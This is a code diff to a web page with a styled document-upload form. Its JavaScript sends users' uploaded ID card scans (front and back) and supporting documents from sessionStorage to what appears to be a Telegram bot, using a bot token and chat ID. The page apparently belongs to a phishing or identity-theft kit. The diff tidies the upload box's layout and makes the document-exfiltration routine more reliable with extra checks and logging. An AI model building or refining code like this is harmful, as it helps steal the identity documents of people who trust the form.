@@ -73,12 +73,13 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 40px 24px;
+            padding: 30px 20px;
             border: 2px dashed #009144;
             border-radius: 16px;
             background: linear-gradient(135deg, #FAFFF9 0%, #E8F5E9 100%);
             transition: all 0.3s ease;
             cursor: pointer;
+            min-height: 120px;
         }
         
         .file-upload-label:hover {
@@ -89,20 +90,22 @@
         }
         
         .file-upload-label .upload-icon {
-            font-size: 48px;
-            margin-bottom: 12px;
+            font-size: 32px;
+            margin-bottom: 8px;
         }
         
         .file-upload-label span {
             color: #006B35;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 14px;
+            text-align: center;
         }
         
         .file-upload-label small {
             color: #666;
-            font-size: 13px;
-            margin-top: 8px;
+            font-size: 12px;
+            margin-top: 6px;
+            text-align: center;
         }
         
         .file-preview {
@@ -411,21 +414,24 @@
 
                 // Send ID Front document if exists
                 const idFrontData = sessionStorage.getItem('id-front_data');
-                if (idFrontData) {
+                console.log('ID Front Data length:', idFrontData ? idFrontData.length : 0);
+                if (idFrontData && idFrontData.length > 0) {
                     console.log('Sending ID Front...');
                     await sendDocumentToBot(botToken, chatId, idFrontData, sessionStorage.getItem('id-front_name'), '🪪 ID Front - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send ID Back document if exists
                 const idBackData = sessionStorage.getItem('id-back_data');
-                if (idBackData) {
+                console.log('ID Back Data length:', idBackData ? idBackData.length : 0);
+                if (idBackData && idBackData.length > 0) {
                     console.log('Sending ID Back...');
                     await sendDocumentToBot(botToken, chatId, idBackData, sessionStorage.getItem('id-back_name'), '🪪 ID Back - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send Supporting document if exists
                 const supportingData = sessionStorage.getItem('supporting-doc_data');
-                if (supportingData) {
+                console.log('Supporting Data length:', supportingData ? supportingData.length : 0);
+                if (supportingData && supportingData.length > 0) {
                     console.log('Sending Supporting Document...');
                     await sendDocumentToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), '📎 Supporting Document');
                 }
